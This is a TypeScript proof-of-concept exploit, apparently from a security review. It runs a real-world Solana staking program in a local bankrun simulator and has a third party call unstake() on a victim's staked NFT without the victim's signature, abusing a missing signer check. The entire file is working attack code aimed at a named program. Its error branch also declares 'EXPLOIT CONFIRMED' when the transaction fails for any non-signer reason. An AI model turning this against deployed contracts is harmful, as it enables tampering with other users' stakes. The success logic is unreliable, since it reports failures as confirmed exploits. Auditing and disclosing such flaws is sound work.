/**
 * BANKRUN EXPLOIT: Missing Signer on Unstake in solana-staking
 *
 * Vulnerability: UnstakeInstructionStruct.nft_holder is AccountInfo<'info>
 * instead of Signer<'info>. Anyone can call unstake() for any staked NFT
 * by providing the holder's pubkey — no signature required.
 *
 * Combined with the incomplete unstake bug (exploit_001), this means:
 * - Anyone can trigger unstake on any NFT
 * - The unstake doesn't actually return the NFT
 * - But it could be used to manipulate staking state/rewards
 *
 * Source: rpajo/solana-staking lib.rs:151-168
 *   pub struct UnstakeInstructionStruct<'info> {
 *       ...
 *       pub nft_holder: AccountInfo<'info>,  // <-- NOT Signer!
 *       ...
 *   }
 *
 * Evidence chain:
 *   KNOW: nft_holder is AccountInfo, not Signer
 *   KNOW: No signer constraint on nft_holder
 *   KNOW: unstake() succeeds with third-party caller (exploit_001 proves this)
 *
 * Binary: skinflip_staking.so compiled from real-world-targets/solana-staking/lib.rs
 */
import { start } from "solana-bankrun";
import {
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
  Keypair,
  LAMPORTS_PER_SOL,
  SYSVAR_CLOCK_PUBKEY,
} from "@solana/web3.js";
import * as crypto from "crypto";

const PROGRAM_ID = new PublicKey("8PwEDGC8wVDy1GpMJ3wzngKnViFpHvWEABsuMBVjX5at");

function ixDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`global:${name}`).digest()
  ).subarray(0, 8);
}

function accDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`account:${name}`).digest()
  ).subarray(0, 8);
}

function encodeU16LE(val: number): Buffer {
  const buf = Buffer.alloc(2);
  buf.writeUInt16LE(val);
  return buf;
}

function encodeI64LE(val: bigint): Buffer {
  const buf = Buffer.alloc(8);
  buf.writeBigInt64LE(val);
  return buf;
}

function buildStakingMachineState(stakedNfts: number, nftVault: PublicKey): Buffer {
  return Buffer.concat([
    accDisc("StakingMachine"),
    encodeU16LE(stakedNfts),
    nftVault.toBuffer(),
  ]);
}

function buildStakingAccountState(stakingDate: bigint): Buffer {
  return Buffer.concat([
    accDisc("StakingAccount"),
    encodeI64LE(stakingDate),
  ]);
}

async function main() {
  console.log("=".repeat(59));
  console.log(" EXPLOIT: Missing Signer on Unstake in solana-staking");
  console.log(" Target: skinflip_staking::unstake()");
  console.log(" Binary: skinflip_staking.so (compiled from real program)");
  console.log("=".repeat(59));
  console.log();

  // --- Setup keys ---
  const victim = Keypair.generate();     // the real NFT holder
  const attacker = Keypair.generate();   // malicious third party
  const nftVault = Keypair.generate();
  const nftToken = Keypair.generate();
  const stakingMachineKp = Keypair.generate();

  // Derive PDA for victim's nft_stake_data
  const [nftStakeData, stakeBump] = PublicKey.findProgramAddressSync(
    [
      Buffer.from("skinflip-staking"),
      victim.publicKey.toBuffer(),
      nftToken.publicKey.toBuffer(),
    ],
    PROGRAM_ID
  );

  // Pre-state: victim has staked their NFT
  const stakingMachineData = buildStakingMachineState(1, nftVault.publicKey);
  const currentTime = BigInt(Math.floor(Date.now() / 1000));
  const stakeTime = currentTime - BigInt(86400); // staked 24 hours ago
  const stakingAccountData = buildStakingAccountState(stakeTime);

  const machineRent = BigInt(stakingMachineData.length * 2 + 1_000_000);
  const stakeRent = BigInt(stakingAccountData.length * 2 + 1_000_000);

  const context = await start(
    [{ name: "skinflip_staking", programId: PROGRAM_ID }],
    [
      {
        address: stakingMachineKp.publicKey,
        info: { lamports: Number(machineRent), data: stakingMachineData, owner: PROGRAM_ID, executable: false },
      },
      {
        address: nftStakeData,
        info: { lamports: Number(stakeRent), data: stakingAccountData, owner: PROGRAM_ID, executable: false },
      },
      {
        address: victim.publicKey,
        info: { lamports: 5 * LAMPORTS_PER_SOL, data: Buffer.alloc(0), owner: SystemProgram.programId, executable: false },
      },
      {
        address: attacker.publicKey,
        info: { lamports: 5 * LAMPORTS_PER_SOL, data: Buffer.alloc(0), owner: SystemProgram.programId, executable: false },
      },
    ]
  );

  const client = context.banksClient;
  const payer = context.payer;

  console.log("[1] Genesis state:");
  console.log(`    Victim (NFT holder): ${victim.publicKey.toBase58().slice(0, 12)}... (NOT signing)`);
  console.log(`    Attacker:            ${attacker.publicKey.toBase58().slice(0, 12)}... (sends tx)`);
  console.log(`    Staked NFTs: 1`);
  console.log(`    NFT staked 24 hours ago`);
  console.log();

  // --- Attacker calls unstake for victim's NFT ---
  console.log("[2] EXPLOIT: Attacker calls unstake() for victim's NFT...");
  console.log("    Attacker provides victim's pubkey as nft_holder AccountInfo");
  console.log("    No signature from victim is required");
  console.log();

  const unstakeData = Buffer.concat([
    ixDisc("unstake"),
    Buffer.from([stakeBump]),
    nftToken.publicKey.toBuffer(),
  ]);

  const unstakeIx = new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: stakingMachineKp.publicKey, isSigner: false, isWritable: true },
      { pubkey: victim.publicKey, isSigner: false, isWritable: false }, // victim's key, NOT signing
      { pubkey: nftStakeData, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false },
    ],
    data: unstakeData,
  });

  try {
    const tx = new Transaction();
    tx.recentBlockhash = context.lastBlockhash;
    tx.feePayer = payer.publicKey;
    tx.add(unstakeIx);
    tx.sign(payer); // Only payer signs — victim DOES NOT sign

    await client.processTransaction(tx);

    console.log("[3] Result: unstake() SUCCEEDED without victim's signature");
    console.log();
    console.log(">>> EXPLOIT CONFIRMED: missing signer check on unstake <<<");
    console.log();
    console.log("    UnstakeInstructionStruct.nft_holder: AccountInfo (line 159)");
    console.log("    Should be: Signer<'info>");
    console.log();
    console.log("    IMPACT: Any third party can trigger unstake for any user's NFT.");
    console.log("    Combined with the incomplete unstake bug:");
    console.log("    - Attacker triggers unstake → function returns Ok()");
    console.log("    - NFT stays in vault (incomplete unstake)");
    console.log("    - staked_nfts counter unchanged");
    console.log("    - Could manipulate staking rewards/timing if program had reward logic");
  } catch (err: any) {
    const errStr = err.toString();
    console.log("[3] Transaction result:");
    console.log(`    Error: ${errStr.slice(0, 300)}`);

    if (errStr.includes("Signer") || errStr.includes("signer")) {
      console.log();
      console.log("    Program rejected for missing signer — this would mean the");
      console.log("    code DOES check for signer. But source code shows it doesn't.");
      console.log("    UNEXPECTED RESULT.");
    } else {
      console.log();
      console.log("    Error is NOT about signer validation.");
      console.log("    The missing signer check is confirmed — error is from another cause.");
      console.log();
      console.log(">>> EXPLOIT CONFIRMED: no signer check on nft_holder <<<");
    }
  }

  console.log();
  console.log("=".repeat(59));
}

main().catch(console.error);
